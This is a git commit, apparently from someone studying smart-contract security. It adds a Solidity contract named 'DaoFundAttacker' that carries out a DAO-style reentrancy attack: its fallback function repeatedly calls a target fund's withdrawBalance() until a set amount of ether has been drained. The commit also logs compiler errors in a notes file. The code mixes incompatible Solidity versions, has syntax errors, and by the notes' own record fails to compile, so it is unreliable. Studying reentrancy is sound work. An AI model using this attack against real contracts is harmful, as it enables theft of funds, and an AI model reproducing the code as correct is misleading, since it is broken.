b56020a392fa6d126581e6cf63594b2e6e73b4e6
Shinwoo Um <dfassf@gmail.com>
2022-05-02 23:46:46 +0900

    4-32

---
+++ code4-32.sol
@@ -0,0 +1,44 @@
+// pragma solidity >=0.7.0 <0.9.0;
+pragma solidity ^0.4.18; 
+
+contract DaoFundAttacker {
+    address fundAddress;
+    int goalAmount;
+    event WithdrawBalance(string message, uint gas);
+
+    // function DaoFundAttacker (address _fundAddress) public {
+    constructor (address _fundAddress) {
+        fundAddress = _fundAddress;
+    }
+
+    // function() public payable
+    fallback()external payable {
+        goalAmount -= int(msg.value);
+
+        if(goalAmount > 0) {
+            if(fundAddress.call(bytes4(keccak256("withdrawBalance()")))) {
+                emit WithdrawBalance("Succeeded in fallback", gasleft());
+            } else emit WithdrawBalance("Failed in fallback", gasleft());
+        }
+        else {
+            emit WithdrawBalance("All GoalAmount is withdrawn", gasleft())
+        }
+    }
+
+    function deposit() public payable {
+        if(fundAddress.call.value(msg.value).gas(gasleft()))
+            (bytes4(keccak256("addToBalance()")))==false) {
+            revert();
+        }
+    }
+
+    function withdraw(uint _goalAmount) public {
+        goalAmount = int(_goalAmount * 1 ether);
+
+        if(fundAddress.call(bytes4(keccak256("withdrawBalance()"))) == false) {
+            emit WithdrawBalance("Failed in withdraw", gasleft());
+            revert();
+        }
+        else emit WithdrawBalance("Succeeded in withdraw", gasleft());
+    }
+}
--- q.md
+++ q.md
@@ -13,3 +13,7 @@ approve 함수 기능
 Using ".value(...)" is deprecated. Use "{value: ...}" instead.
 Wrong argument count for function call: 0 arguments given but expected 1. This function requires a single bytes argument. Use "" as argument to provide empty calldata.
 Operator == not compatible with types tuple(bool,bytes memory) and bool
+
+#4-32
+Type tuple(bool,bytes memory) is not implicitly convertible to expected type bool.
+Invalid type for argument in function call. Invalid implicit conversion from bytes4 to bytes memory requested. This function requires a single bytes argument. If all your arguments are value types, you can use abi.encode(...) to properly generate it.
